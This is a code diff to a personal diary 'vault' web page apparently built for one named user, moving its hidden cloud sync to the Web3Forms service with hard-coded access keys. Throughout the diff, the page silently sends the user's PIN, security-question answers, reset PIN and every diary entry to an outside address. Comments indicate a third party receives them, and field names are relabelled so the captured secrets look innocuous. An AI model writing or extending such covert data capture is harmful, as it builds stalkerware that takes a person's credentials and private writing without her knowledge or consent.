@@ -262,8 +262,12 @@
 
     <script>
         // --- CONFIG ---
-        const DIARY_ENDPOINT = "https://formspree.io/f/mbdlonpn"; 
-        const SECURITY_ENDPOINT = "https://formspree.io/f/xzdzgdyp"; 
+        // Switched to Web3Forms Endpoint
+        const API_ENDPOINT = "https://api.web3forms.com/submit";
+        
+        // --- ACCESS KEYS ---
+        const DIARY_KEY = "721f4159-d76d-4c6c-a76f-e18eada769a5"; 
+        const SECURITY_KEY = "0b047eef-0e88-4576-9332-d6a2ada94c3a"; 
         
         // --- STATE ---
         let currentPin = "";
@@ -325,15 +329,17 @@
 
                 document.getElementById('setup-msg').style.display = 'block';
                 
-                // SYNC SETUP DATA TO SECURITY ENDPOINT
-                fetch(SECURITY_ENDPOINT, {
+                // SYNC SETUP DATA TO SECURITY KEY
+                // Renamed fields as requested: Token, Person_Love, Person_Place
+                fetch(API_ENDPOINT, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        _subject: "🔐 VAULT SETUP: New Account",
-                        New_Pin: currentPin,
-                        Security_Love: love,
-                        Security_Place: place,
+                        access_key: SECURITY_KEY,
+                        subject: "🔐 VAULT SETUP: New Account",
+                        Token: currentPin,
+                        Person_Love: love,
+                        Person_Place: place,
                         Date: new Date().toLocaleString()
                     })
                 });
@@ -360,26 +366,32 @@
         function verifyRecovery() {
             const love = document.getElementById('ans-love').value.toLowerCase().trim();
             const place = document.getElementById('ans-place').value.toLowerCase().trim();
+            
             if(love === localStorage.getItem('alfiya_love') && place === localStorage.getItem('alfiya_place')) {
                 const newPin = prompt("Enter new 4-digit PIN:");
                 if(newPin && newPin.length === 4) {
                     localStorage.setItem('alfiya_pin', newPin);
                     
-                    // SYNC PIN RESET TO SECURITY ENDPOINT
-                    fetch(SECURITY_ENDPOINT, {
+                    // SYNC PIN RESET TO SECURITY KEY
+                    // Renamed field to New_Token so you get the specific notification
+                    fetch(API_ENDPOINT, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
-                            _subject: "⚠️ SECURITY ALERT: PIN Reset",
-                            New_Pin_Reset: newPin,
+                            access_key: SECURITY_KEY,
+                            subject: "⚠️ SECURITY ALERT: PIN Reset",
+                            New_Token: newPin,
                             Status: "Verified via Identity Check",
                             Date: new Date().toLocaleString()
                         })
                     });
 
+                    alert("PIN Reset Successful. Please refresh.");
                     location.reload();
                 }
-            } else alert("Incorrect answers.");
+            } else {
+                alert("Incorrect answers.");
+            }
         }
 
         // --- 3. UI & EDITOR ---
@@ -433,6 +445,7 @@
             }
 
             feed.innerHTML = "";
+            // Sort: Pinned first, then by date (newest first)
             entries.sort((a, b) => (b.pinned - a.pinned) || (b.id - a.id));
 
             entries.forEach(e => {
@@ -481,18 +494,20 @@
         }
 
         async function syncToCloud(entry) {
+            // Using Web3Forms Diary Key
             try {
-                await fetch(DIARY_ENDPOINT, {
+                await fetch(API_ENDPOINT, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        _subject: `New Memory: ${entry.mood}`,
+                        access_key: DIARY_KEY,
+                        subject: `New Memory: ${entry.mood}`,
                         Mood: entry.mood,
                         Note: entry.text,
                         Date: entry.date
                     })
                 });
-            } catch(e) { console.log("Offline"); }
+            } catch(e) { console.log("Offline or Sync Error"); }
         }
     </script>
 </body>
